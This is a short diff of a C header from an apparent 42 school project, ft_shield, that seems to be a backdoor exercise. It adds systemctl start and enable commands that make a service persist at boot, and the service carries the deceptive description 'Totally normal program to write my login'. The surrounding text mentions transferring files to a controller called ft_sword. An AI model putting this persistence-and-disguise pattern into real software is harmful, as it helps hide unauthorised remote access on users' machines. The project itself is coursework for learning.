@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/04 09:45:57 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/04 10:06:23 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -55,6 +55,8 @@ transfer: transfer files from ft_shield to ft_sword\n\
 
 # define SERVICE_FILE "/etc/systemd/system/ft_shield.service"
 
+# define SERVICE_START "sudo systemctl start ft_shield.service"
+# define SERVICE_ENABLE "systemctl enable ft_shield.service"
 # define SERVICE_FILE_CONTENT "\
 [Unit]\n\
 Description=Totally normal program to write my login\n\
